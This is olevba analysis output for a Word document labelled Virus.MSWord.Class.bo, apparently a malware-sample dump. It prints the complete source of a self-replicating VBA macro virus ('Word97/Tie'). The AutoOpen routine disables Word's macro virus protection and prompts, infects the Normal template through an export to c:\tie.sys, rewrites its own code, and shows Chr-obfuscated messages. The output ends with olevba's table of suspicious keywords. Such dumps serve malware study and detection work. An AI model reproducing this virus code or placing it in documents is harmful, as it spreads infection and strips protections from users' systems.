olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bo-e17be711eef715d10dca3aa332b3644770415ce6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bo-e17be711eef715d10dca3aa332b3644770415ce6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Word97/Tie by Virustest
On Error GoTo 73
'Word97/Tie by Virustest
Options.VirusProtection = False
'Word97/Tie by Virustest
Options.SaveNormalPrompt = False
'Word97/Tie by Virustest
Options.ConfirmConversions = False
'Word97/Tie by Virustest
ties = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Word97/Tie by Virustest
tier = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Word97/Tie by Virustest
If tier > 76 And ties > 0 Then GoTo 73
'Word97/Tie by Virustest
If tier < 76 Then
'Word97/Tie by Virustest
 Set tvir = NormalTemplate.VBProject.VBComponents.Item(1)
'Word97/Tie by Virustest
 ActiveDocument.VBProject.VBComponents.Item(1).Name = tvir.Name
'Word97/Tie by Virustest
 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\tie.sys"
'Word97/Tie by Virustest
End If
'Word97/Tie by Virustest
If ties = 0 Then Set tvir = ActiveDocument.VBProject.VBComponents.Item(1)
'Word97/Tie by Virustest
 Infection = Int(Rnd * 100)
'Word97/Tie by Virustest
 If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Word97/Tie by Virustest
 If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Word97/Tie by Virustest
 tvir.codemodule.AddFromFile ("c:\tie.sys")
'Word97/Tie by Virustest
 With tvir.codemodule
'Word97/Tie by Virustest
    For x = 1 To 4
'Word97/Tie by Virustest
    .deletelines 1
'Word97/Tie by Virustest
    Next x
'Word97/Tie by Virustest
 End With
'Word97/Tie by Virustest
 If tier < 76 Then
'Word97/Tie by Virustest
    With tvir.codemodule
'Word97/Tie by Virustest
    .replaceline 1, "Sub AutoClose()"
'Word97/Tie by Virustest
    .replaceline 81, "Sub ToolsMacro()"
'Word97/Tie by Virustest
    .replaceline 29, "If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)"
'Word97/Tie by Virustest
    .replaceline 31, "Infection = Int (Rnd *100)"
'Word97/Tie by Virustest
    .replaceline 33, "If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)"
'Word97/Tie by Virustest
  End With
'Word97/Tie by Virustest
 End If
'Word97/Tie by Virustest
 With tvir.codemodule
'Word97/Tie by Virustest
    For x = 2 To 78 Step 2
'Word97/Tie by Virustest
    .replaceline x, "'Word97/Tie by Virus" & Application.ActiveWindow
'Word97/Tie by Virustest
    Next x
'Word97/Tie by Virustest
 End With
'Word97/Tie by Virustest
73:
'Word97/Tie by Virustest
 If tier > 76 And ties = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Word97/Tie by Virustest
 End Sub

Sub ViewVBCode()

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

